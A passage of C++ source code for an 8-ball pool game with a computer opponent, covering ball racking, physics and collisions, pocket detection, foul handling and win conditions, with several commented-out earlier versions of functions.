        float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

        // Define rack positions (0-14 indices corresponding to triangle spots)
        D2D1_POINT_2F rackPositions[15];
        int rackIndex = 0;
        for (int row = 0; row < 5; ++row) {
            for (int col = 0; col <= row; ++col) {
                if (rackIndex >= 15) break;
                float x = RACK_POS_X + row * spacingX;
                float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
                rackPositions[rackIndex++] = D2D1::Point2F(x, y);
            }
        }

        // Separate 8-ball
        Ball eightBall;
        std::vector<Ball> otherBalls; // Solids and Stripes
        bool eightBallFound = false;
        for (const auto& ball : objectBalls) {
            if (ball.id == 8) {
                eightBall = ball;
                eightBallFound = true;
            }
            else {
                otherBalls.push_back(ball);
            }
        }
        // Ensure 8 ball was actually created (should always be true)
        if (!eightBallFound) {
            // Handle error - perhaps recreate it? For now, proceed.
            eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
        }


        // Shuffle the other 14 balls
        // Use std::shuffle if available (C++11 and later) for better randomness
        // std::random_device rd;
        // std::mt19937 g(rd());
        // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
        std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

        // --- Place balls into the main 'balls' vector in rack order ---
        // Important: Add the cue ball (already created) first.
        // (Cue ball added at the start of the function now)

        // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
        int eightBallRackIndex = 4;
        eightBall.x = rackPositions[eightBallRackIndex].x;
        eightBall.y = rackPositions[eightBallRackIndex].y;
        eightBall.vx = 0;
        eightBall.vy = 0;
        eightBall.isPocketed = false;
        balls.push_back(eightBall); // Add 8 ball to the main vector

        // 2. Place the shuffled Solids and Stripes in the remaining spots
        size_t otherBallIdx = 0;
        //int otherBallIdx = 0;
        for (int i = 0; i < 15; ++i) {
            if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

            if (otherBallIdx < otherBalls.size()) {
                Ball& ballToPlace = otherBalls[otherBallIdx++];
                ballToPlace.x = rackPositions[i].x;
                ballToPlace.y = rackPositions[i].y;
                ballToPlace.vx = 0;
                ballToPlace.vy = 0;
                ballToPlace.isPocketed = false;
                balls.push_back(ballToPlace); // Add to the main game vector
            }
        }
        // --- End Racking Logic ---


        // --- Determine Who Breaks and Initial State ---
        if (isPlayer2AI) {
            /*// AI Mode: Randomly decide who breaks
            if ((rand() % 2) == 0) {
                // AI (Player 2) breaks
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
                aiTurnPending = true; // Trigger AI logic
            }
            else {
                // Player 1 (Human) breaks
                currentPlayer = 1;
                currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
                aiTurnPending = false;*/
            switch (openingBreakMode) {
            case CPU_BREAK:
                currentPlayer = 2; // AI breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            case P1_BREAK:
                currentPlayer = 1; // Player 1 breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = false;
                break;
            case FLIP_COIN_BREAK:
                if ((rand() % 2) == 0) { // 0 for AI, 1 for Player 1
                    currentPlayer = 2; // AI breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = true;
                }
                else {
                    currentPlayer = 1; // Player 1 breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = false;
                }
                break;
            default: // Fallback to CPU break
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            }
        }
        else {
            // Human vs Human, Player 1 always breaks (or could add a flip coin for HvsH too if desired)
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT;
            aiTurnPending = false; // No AI involved
        }

        // Reset other relevant game state variables
        foulCommitted = false;
        gameOverMessage = L"""";
        firstBallPocketedAfterBreak = false;
        // pocketedThisTurn cleared at start
        // Reset shot parameters and input flags
        shotPower = 0.0f;
        cueSpinX = 0.0f;
        cueSpinY = 0.0f;
        isAiming = false;
        isDraggingCueBall = false;
        isSettingEnglish = false;
        cueAngle = 0.0f; // Reset aim angle
    }


    // --------------------------------------------------------------------------------
    // Full GameUpdate(): integrates AI call?pocket ? aim ? shoot (no omissions)
    // --------------------------------------------------------------------------------
    void GameUpdate() {
        // --- 1) Handle an in?flight shot ---
        if (currentGameState == SHOT_IN_PROGRESS) {
            UpdatePhysics();
            // ? clear old 8?ball pocket info before any new pocket checks
            //lastEightBallPocketIndex = -1;
            CheckCollisions();
            CheckPockets(); // FIX: This line was missing. It's essential to check for pocketed balls every frame.

            if (AreBallsMoving()) {
                isAiming = false;
                aiIsDisplayingAim = false;
            }

            if (!AreBallsMoving()) {
                ProcessShotResults();
            }
            return;
        }

        // --- 2) CPU’s turn (table is static) ---
        if (isPlayer2AI && currentPlayer == 2 && !AreBallsMoving()) {
            // ??? If we've just auto?entered AI_THINKING for the 8?ball call, actually make the decision ???
            if (currentGameState == AI_THINKING && aiTurnPending) {
                aiTurnPending = false;        // consume the pending flag
                AIMakeDecision();             // CPU calls its pocket or plans its shot
                return;                       // done this tick
            }

            // ??? Automate the AI pocket?selection click ???
            if (currentGameState == CHOOSING_POCKET_P2) {
                // AI immediately confirms its call and moves to thinking/shooting
                currentGameState = AI_THINKING;
                aiTurnPending = true;
                return; // process on next tick
            }
            // 2A) If AI is displaying its aim line, count down then shoot
            if (aiIsDisplayingAim) {
                aiAimDisplayFramesLeft--;
                if (aiAimDisplayFramesLeft <= 0) {
                    aiIsDisplayingAim = false;
                    if (aiPlannedShotDetails.isValid) {
                        firstHitBallIdThisShot = -1;
                        cueHitObjectBallThisShot = false;
                        railHitAfterContact = false;
                        std::thread([](const TCHAR* soundName) {
                            PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT);
                            }, TEXT(""cue.wav"")).detach();

                            ApplyShot(
                                aiPlannedShotDetails.power,
                                aiPlannedShotDetails.angle,
                                aiPlannedShotDetails.spinX,
                                aiPlannedShotDetails.spinY
                            );
                            aiPlannedShotDetails.isValid = false;
                    }
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false;
                    pocketedThisTurn.clear();
                }
                return;
            }

            // 2B) Immediately after calling pocket, transition into AI_THINKING
            if (currentGameState == CHOOSING_POCKET_P2 && aiTurnPending) {
                // Start thinking/shooting right away—no human click required
                currentGameState = AI_THINKING;
                aiTurnPending = false;
                AIMakeDecision();
                return;
            }

            // 2C) If AI has pending actions (break, ball?in?hand, or normal turn)
            if (aiTurnPending) {
                if (currentGameState == BALL_IN_HAND_P2) {
                    AIPlaceCueBall();
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                else if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
                    AIBreakShot();
                }
                else if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING) {
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                return;
            }
        }
    }


    // --- Physics and Collision ---
    void UpdatePhysics() {
        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b = balls[i];
            if (!b.isPocketed) {
                b.x += b.vx;
                b.y += b.vy;

                // Apply friction
                b.vx *= FRICTION;
                b.vy *= FRICTION;

                // Stop balls if velocity is very low
                if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                    b.vx = 0;
                    b.vy = 0;
                }

                /* -----------------------------------------------------------------
       Additional clamp to guarantee the ball never escapes the table.
       The existing wall–collision code can momentarily disable the
       reflection test while the ball is close to a pocket mouth;
       that rare case allowed it to ‘slide’ through the cushion and
       leave the board.  We therefore enforce a final boundary check
       after the normal physics step.
       ----------------------------------------------------------------- */
                const float leftBound = TABLE_LEFT + BALL_RADIUS;
                const float rightBound = TABLE_RIGHT - BALL_RADIUS;
                const float topBound = TABLE_TOP + BALL_RADIUS;
                const float bottomBound = TABLE_BOTTOM - BALL_RADIUS;

                if (b.x < leftBound) { b.x = leftBound;   b.vx = fabsf(b.vx); }
                if (b.x > rightBound) { b.x = rightBound;  b.vx = -fabsf(b.vx); }
                if (b.y < topBound) { b.y = topBound;    b.vy = fabsf(b.vy); }
                if (b.y > bottomBound) { b.y = bottomBound; b.vy = -fabsf(b.vy); }
            }
        }
    }

    void CheckCollisions() {
        float left = TABLE_LEFT;
        float right = TABLE_RIGHT;
        float top = TABLE_TOP;
        float bottom = TABLE_BOTTOM;
        const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f;

        // --- Reset Per-Frame Sound Flags ---
        bool playedWallSoundThisFrame = false;
        bool playedCollideSoundThisFrame = false;
        // ---

        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b1 = balls[i];
            if (b1.isPocketed) continue;

            bool nearPocket[6];
            for (int p = 0; p < 6; ++p) {
                nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
            }
            bool nearTopLeftPocket = nearPocket[0];
            bool nearTopMidPocket = nearPocket[1];
            bool nearTopRightPocket = nearPocket[2];
            bool nearBottomLeftPocket = nearPocket[3];
            bool nearBottomMidPocket = nearPocket[4];
            bool nearBottomRightPocket = nearPocket[5];

            bool collidedWallThisBall = false;

            // --- Ball-Wall Collisions ---
            // (Check logic unchanged, added sound calls and railHitAfterContact update)
            // Left Wall
            if (b1.x - BALL_RADIUS < left) {
                if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                    b1.x = left + BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Right Wall
            if (b1.x + BALL_RADIUS > right) {
                if (!nearTopRightPocket && !nearBottomRightPocket) {
                    b1.x = right - BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Top Wall
            if (b1.y - BALL_RADIUS < top) {
                if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                    b1.y = top + BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Bottom Wall
            if (b1.y + BALL_RADIUS > bottom) {
                if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                    b1.y = bottom - BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }

            // Spin effect (Unchanged)
            if (collidedWallThisBall) {
                if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { b1.vy += cueSpinX * b1.vx * 0.05f; }
                if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { b1.vx -= cueSpinY * b1.vy * 0.05f; }
                cueSpinX *= 0.7f; cueSpinY *= 0.7f;
            }


            // --- Ball-Ball Collisions ---
            for (size_t j = i + 1; j < balls.size(); ++j) {
                Ball& b2 = balls[j];
                if (b2.isPocketed) continue;

                float dx = b2.x - b1.x; float dy = b2.y - b1.y;
                float distSq = dx * dx + dy * dy;
                float minDist = BALL_RADIUS * 2.0f;

                if (distSq > 1e-6 && distSq < minDist * minDist) {
                    float dist = sqrtf(distSq);
                    float overlap = minDist - dist;
                    float nx = dx / dist; float ny = dy / dist;

                    // Separation (Unchanged)
                    b1.x -= overlap * 0.5f * nx; b1.y -= overlap * 0.5f * ny;
                    b2.x += overlap * 0.5f * nx; b2.y += overlap * 0.5f * ny;

                    float rvx = b1.vx - b2.vx; float rvy = b1.vy - b2.vy;
                    float velAlongNormal = rvx * nx + rvy * ny;

                    if (velAlongNormal > 0) { // Colliding
                        // --- Play Ball Collision Sound ---
                        if (!playedCollideSoundThisFrame) {
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""poolballhit.wav"")).detach();
                            playedCollideSoundThisFrame = true; // Set flag
                        }
                        // --- End Sound ---

                        // --- NEW: Track First Hit and Cue/Object Collision ---
                        if (firstHitBallIdThisShot == -1) { // If first hit hasn't been recorded yet
                            if (b1.id == 0) { // Cue ball hit b2 first
                                firstHitBallIdThisShot = b2.id;
                                cueHitObjectBallThisShot = true;
                            }
                            else if (b2.id == 0) { // Cue ball hit b1 first
                                firstHitBallIdThisShot = b1.id;
                                cueHitObjectBallThisShot = true;
                            }
                            // If neither is cue ball, doesn't count as first hit for foul purposes
                        }
                        else if (b1.id == 0 || b2.id == 0) {
                            // Track subsequent cue ball collisions with object balls
                            cueHitObjectBallThisShot = true;
                        }
                        // --- End First Hit Tracking ---


                        // Impulse (Unchanged)
                        float impulse = velAlongNormal;
                        b1.vx -= impulse * nx; b1.vy -= impulse * ny;
                        b2.vx += impulse * nx; b2.vy += impulse * ny;

                        // Spin Transfer (Unchanged)
                        if (b1.id == 0 || b2.id == 0) {
                            float spinEffectFactor = 0.08f;
                            b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            cueSpinX *= 0.85f; cueSpinY *= 0.85f;
                        }
                    }
                }
            } // End ball-ball loop
        } // End ball loop
    } // End CheckCollisions


    bool CheckPockets() {
        bool anyPocketed = false;
        // FIX: Declare a local flag to ensure the sound only plays ONCE per function call.
        bool ballPocketedThisCheck = false;
        // For each ball not already pocketed:
        for (auto& b : balls) {
            if (b.isPocketed)
                continue;

            // Check against each pocket
            for (int p = 0; p < 6; ++p) {
                float dx = b.x - pocketPositions[p].x;
                float dy = b.y - pocketPositions[p].y;
                if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                    // It's in the pocket—remove it from play
                    // If it's the 8?ball, remember which pocket it went into
                    if (b.id == 8) {
                        lastEightBallPocketIndex = p;   // <-- Must set here!
                    }
                    b.isPocketed = true;
                    b.vx = b.vy = 0.0f;           // kill any movement
                    pocketedThisTurn.push_back(b.id);
                    anyPocketed = true;

                    // --- FIX: Insert your sound logic here ---
                    // The 'if' guard prevents multiple sounds on a multi-ball break.
                    if (!ballPocketedThisCheck) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""pocket.wav"")).detach();
                        ballPocketedThisCheck = true;
                    }
                    // --- End Sound Fix ---

                    break;  // no need to check other pockets for this ball
                }
            }
        }
        return anyPocketed;
    }

    bool AreBallsMoving() {
        for (size_t i = 0; i < balls.size(); ++i) {
            if (!balls[i].isPocketed && (balls[i].vx != 0 || balls[i].vy != 0)) {
                return true;
            }
        }
        return false;
    }

    void RespawnCueBall(bool behindHeadstring) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {
            // Determine the initial target position
            float targetX, targetY;
            if (behindHeadstring) {
                targetX = TABLE_LEFT + (HEADSTRING_X - TABLE_LEFT) * 0.5f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }
            else {
                targetX = TABLE_LEFT + TABLE_WIDTH / 2.0f;
                targetY = TABLE_TOP + TABLE_HEIGHT / 2.0f;
            }

            // FOOLPROOF FIX: Check if the target spot is valid. If not, nudge it until it is.
            int attempts = 0;
            while (!IsValidCueBallPosition(targetX, targetY, behindHeadstring) && attempts < 100) {
                // If the spot is occupied, try nudging the ball slightly.
                targetX += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                targetY += (static_cast<float>(rand() % 100 - 50) / 50.0f) * BALL_RADIUS;
                // Clamp to stay within reasonable bounds
                targetX = std::max(TABLE_LEFT + BALL_RADIUS, std::min(targetX, TABLE_RIGHT - BALL_RADIUS));
                targetY = std::max(TABLE_TOP + BALL_RADIUS, std::min(targetY, TABLE_BOTTOM - BALL_RADIUS));
                attempts++;
            }

            // Set the final, valid position.
            cueBall->x = targetX;
            cueBall->y = targetY;
            cueBall->vx = 0;
            cueBall->vy = 0;
            cueBall->isPocketed = false;

            // Set the correct game state for ball-in-hand.
            if (currentPlayer == 1) {
                currentGameState = BALL_IN_HAND_P1;
                aiTurnPending = false;
            }
            else {
                currentGameState = BALL_IN_HAND_P2;
                if (isPlayer2AI) {
                    aiTurnPending = true;
                }
            }
        }
    }


    // --- Game Logic ---

    void ApplyShot(float power, float angle, float spinX, float spinY) {
        Ball* cueBall = GetCueBall();
        if (cueBall) {

            // --- Play Cue Strike Sound (Threaded) ---
            if (power > 0.1f) { // Only play if it's an audible shot
                std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
            }
            // --- End Sound ---

            cueBall->vx = cosf(angle) * power;
            cueBall->vy = sinf(angle) * power;

            // Apply English (Spin) - Simplified effect (Unchanged)
            cueBall->vx += sinf(angle) * spinY * 0.5f;
            cueBall->vy -= cosf(angle) * spinY * 0.5f;
            cueBall->vx -= cosf(angle) * spinX * 0.5f;
            cueBall->vy -= sinf(angle) * spinX * 0.5f;

            // Store spin (Unchanged)
            cueSpinX = spinX;
            cueSpinY = spinY;

            // --- Reset Foul Tracking flags for the new shot ---
            // (Also reset in LBUTTONUP, but good to ensure here too)
            firstHitBallIdThisShot = -1;      // No ball hit yet
            cueHitObjectBallThisShot = false; // Cue hasn't hit anything yet
            railHitAfterContact = false;     // No rail hit after contact yet
            // --- End Reset ---

                    // If this was the opening break shot, clear the flag
            if (isOpeningBreakShot) {
                isOpeningBreakShot = false; // Mark opening break as taken
            }
        }
    }


    // ---------------------------------------------------------------------
    //  ProcessShotResults()
    // ---------------------------------------------------------------------
    void ProcessShotResults() {
        bool cueBallPocketed = false;
        bool eightBallPocketed = false;
        bool playerContinuesTurn = false;

        // --- Step 1: Update Ball Counts FIRST (THE CRITICAL FIX) ---
        // We must update the score before any other game logic runs.
        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        int ownBallsPocketedThisTurn = 0;

        for (int id : pocketedThisTurn) {
            Ball* b = GetBallById(id);
            if (!b) continue;

            if (b->id == 0) {
                cueBallPocketed = true;
            }
            else if (b->id == 8) {
                eightBallPocketed = true;
            }
            else {
                // This is a numbered ball. Update the pocketed count for the correct player.
                if (b->type == player1Info.assignedType && player1Info.assignedType != BallType::NONE) {
                    player1Info.ballsPocketedCount++;
                }
                else if (b->type == player2Info.assignedType && player2Info.assignedType != BallType::NONE) {
                    player2Info.ballsPocketedCount++;
                }

                if (b->type == shootingPlayer.assignedType) {
                    ownBallsPocketedThisTurn++;
                }
            }
        }

        if (ownBallsPocketedThisTurn > 0) {
            playerContinuesTurn = true;
        }

        // --- Step 2: Handle Game-Ending 8-Ball Shot ---
        // Now that the score is updated, this check will have the correct information.
        if (eightBallPocketed) {
            CheckGameOverConditions(true, cueBallPocketed);
            if (currentGameState == GAME_OVER) {
                pocketedThisTurn.clear();
                return;
            }
        }

        // --- Step 3: Check for Fouls ---
        bool turnFoul = false;
        if (cueBallPocketed) {
            turnFoul = true;
        }
        else {
            Ball* firstHit = GetBallById(firstHitBallIdThisShot);
            if (!firstHit) { // Rule: Hitting nothing is a foul.
                turnFoul = true;
            }
            else { // Rule: Hitting the wrong ball type is a foul.
                if (player1Info.assignedType != BallType::NONE) { // Colors are assigned.
                    // We check if the player WAS on the 8-ball BEFORE this shot.
                    bool wasOnEightBall = (shootingPlayer.assignedType != BallType::NONE && (shootingPlayer.ballsPocketedCount - ownBallsPocketedThisTurn) >= 7);
                    if (wasOnEightBall) {
                        if (firstHit->id != 8) turnFoul = true;
                    }
                    else {
                        if (firstHit->type != shootingPlayer.assignedType) turnFoul = true;
                    }
                }
            }
        } //reenable below disabled for debugging
        //if (!turnFoul && cueHitObjectBallThisShot && !railHitAfterContact && pocketedThisTurn.empty()) {
            //turnFoul = true;
        //}
        foulCommitted = turnFoul;

        // --- Step 4: Final State Transition ---
        if (foulCommitted) {
            SwitchTurns();
            RespawnCueBall(false);
        }
        else if (player1Info.assignedType == BallType::NONE && !pocketedThisTurn.empty() && !cueBallPocketed) {
            // Assign types on the break.
            for (int id : pocketedThisTurn) {
                Ball* b = GetBallById(id);
                if (b && b->type != BallType::EIGHT_BALL) {
                    AssignPlayerBallTypes(b->type);
                    break;
                }
            }
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else if (playerContinuesTurn) {
            // The player's turn continues. Now the check will work correctly.
            CheckAndTransitionToPocketChoice(currentPlayer);
        }
        else {
            SwitchTurns();
        }

        pocketedThisTurn.clear();
    }

    /*
    // --- Step 3: Final State Transition ---
    if (foulCommitted) {
        SwitchTurns();
        RespawnCueBall(false);
    }
    else if (playerContinuesTurn) {
        CheckAndTransitionToPocketChoice(currentPlayer);
    }
    else {
        SwitchTurns();
    }

    pocketedThisTurn.clear();
    } */

    //  Assign groups AND optionally give the shooter his first count.
    bool AssignPlayerBallTypes(BallType firstPocketedType, bool creditShooter /*= true*/)
    {
        if (firstPocketedType != SOLID && firstPocketedType != STRIPE)
            return false;                                 // safety

        /* ---------------------------------------------------------
           1.  Decide the groups
        --------------------------------------------------------- */
        if (currentPlayer == 1)
        {
            player1Info.assignedType = firstPocketedType;
            player2Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }
        else
        {
            player2Info.assignedType = firstPocketedType;
            player1Info.assignedType =
                (firstPocketedType == SOLID) ? STRIPE : SOLID;
        }

        /* ---------------------------------------------------------
           2.  Count the very ball that made the assignment
        --------------------------------------------------------- */
        if (creditShooter)
        {
            if (currentPlayer == 1)
                ++player1Info.ballsPocketedCount;
            else
                ++player2Info.ballsPocketedCount;
        }
        return true;
    }

    /*bool AssignPlayerBallTypes(BallType firstPocketedType) {
        if (firstPocketedType == BallType::SOLID || firstPocketedType == BallType::STRIPE) {
            if (currentPlayer == 1) {
                player1Info.assignedType = firstPocketedType;
                player2Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            else {
                player2Info.assignedType = firstPocketedType;
                player1Info.assignedType = (firstPocketedType == BallType::SOLID) ? BallType::STRIPE : BallType::SOLID;
            }
            return true; // Assignment was successful
        }
        return false; // No assignment made (e.g., 8-ball was pocketed on break)
    }*/
    // If 8-ball was first (illegal on break generally), rules vary.
    // Here, we might ignore assignment until a solid/stripe is pocketed legally.
    // Or assign based on what *else* was pocketed, if anything.
    // Simplification: Assignment only happens on SOLID or STRIPE first pocket.


    // --- Called in ProcessShotResults() after pocket detection ---
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        // Only care if the 8?ball really went in:
        if (!eightBallPocketed) return;

        // Who’s shooting now?
        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        // Which pocket did we CALL?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did it ACTUALLY fall into?
        int actual = lastEightBallPocketIndex;

        // Check legality: must have called a pocket ?0, must match actual,
        // must have pocketed all 7 of your balls first, and must not have scratched.
        bool legal = (called >= 0)
            && (called == actual)
            && (shooter.ballsPocketedCount >= 7)
            && (!cueBallPocketed);

        // Build a message that shows both values for debugging/tracing:
        if (legal) {
            gameOverMessage = shooter.name
                + L"" Wins! ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name
                + L"" Wins! (Illegal 8-Ball) ""
                + L""(Called: "" + std::to_wstring(called)
                + L"", Actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }



    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return;

        PlayerInfo& shootingPlayer = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponentPlayer = (currentPlayer == 1) ? player2Info : player1Info;

        // Handle 8-ball on break: re-spot and continue.
        if (player1Info.assignedType == BallType::NONE) {
            Ball* b = GetBallById(8);
            if (b) { b->isPocketed = false; b->x = RACK_POS_X; b->y = RACK_POS_Y; b->vx = b->vy = 0; }
            if (cueBallPocketed) foulCommitted = true;
            return;
        }

        // --- FOOLPROOF WIN/LOSS LOGIC ---
        bool wasOnEightBall = IsPlayerOnEightBall(currentPlayer);
        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = -1;

        // Find which pocket the 8-ball actually went into.
        for (int id : pocketedThisTurn) {
            if (id == 8) {
                Ball* b = GetBallById(8); // This ball is already marked as pocketed, but we need its last coords.
                if (b) {
                    for (int p_idx = 0; p_idx < 6; ++p_idx) {
                        // Check last known position against pocket centers
                        if (GetDistanceSq(b->x, b->y, pocketPositions[p_idx].x, pocketPositions[p_idx].y) < POCKET_RADIUS * POCKET_RADIUS * 1.5f) {
                            actualPocket = p_idx;
                            break;
                        }
                    }
                }
                break;
            }
        }

        // Evaluate win/loss based on a clear hierarchy of rules.
        if (!wasOnEightBall) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball Pocketed Early)"";
        }
        else if (cueBallPocketed) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Scratched on 8-Ball)"";
        }
        else if (calledPocket == -1) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (Pocket Not Called)"";
        }
        else if (actualPocket != calledPocket) {
            gameOverMessage = opponentPlayer.name + L"" Wins! (8-Ball in Wrong Pocket)"";
        }
        else {
            // WIN! All loss conditions failed, this must be a legal win.
            gameOverMessage = shootingPlayer.name + L"" Wins!"";
        }

        currentGameState = GAME_OVER;
    }*/

    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;
        // Which pocket did we call?
        int called = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        // Which pocket did the ball really fall into?
        int actual = lastEightBallPocketIndex;

        // Legal victory only if:
        //  1) Shooter had already pocketed 7 of their object balls,
        //  2) They called a pocket,
        //  3) The 8?ball actually fell into that same pocket,
        //  4) They did not scratch on the 8?ball.
        bool legal =
            (shooter.ballsPocketedCount >= 7) &&
            (called >= 0) &&
            (called == actual) &&
            (!cueBallPocketed);

        if (legal) {
            gameOverMessage = shooter.name + L"" Wins! ""
                L""(called: "" + std::to_wstring(called) +
                L"", actual: "" + std::to_wstring(actual) + L"")"";
        }
        else {
            gameOverMessage = opponent.name + L"" Wins! (illegal 8-ball) ""
            // For debugging you can append:
            + L"" (called: "" + std::to_wstring(called)
            + L"", actual: "" + std::to_wstring(actual) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    // ????????????????????????????????????????????????????????????????
    //  CheckGameOverConditions()
    //     – Called when the 8-ball has fallen.
    //     – Decides who wins and builds the gameOverMessage.
    // ????????????????????????????????????????????????????????????????
    /*void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed)
    {
        if (!eightBallPocketed) return;                     // safety

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
        PlayerInfo& opponent = (currentPlayer == 1) ? player2Info : player1Info;

        int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        int actualPocket = lastEightBallPocketIndex;

        bool clearedSeven = (shooter.ballsPocketedCount >= 7);
        bool noScratch = !cueBallPocketed;
        bool callMade = (calledPocket >= 0);

        // helper ? turn “-1” into ""None"" for readability
        auto pocketToStr = [](int idx) -> std::wstring
        {
            return (idx >= 0) ? std::to_wstring(idx) : L""None"";
        };

        if (clearedSeven && noScratch && callMade && actualPocket == calledPocket)
        {
            // legitimate win
            gameOverMessage =
                shooter.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }
        else
        {
            // wrong pocket, scratch, or early 8-ball
            gameOverMessage =
                opponent.name +
                L"" Wins! (Called pocket: "" + pocketToStr(calledPocket) +
                L"", Actual pocket: "" + pocketToStr(actualPocket) + L"")"";
        }

        currentGameState = GAME_OVER;
    }*/

    /* void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed) {
        if (!eightBallPocketed) return; // Only when 8-ball actually pocketed

        PlayerInfo& shooter = (currentPlayer == 1) ? player1Info : player2Info;
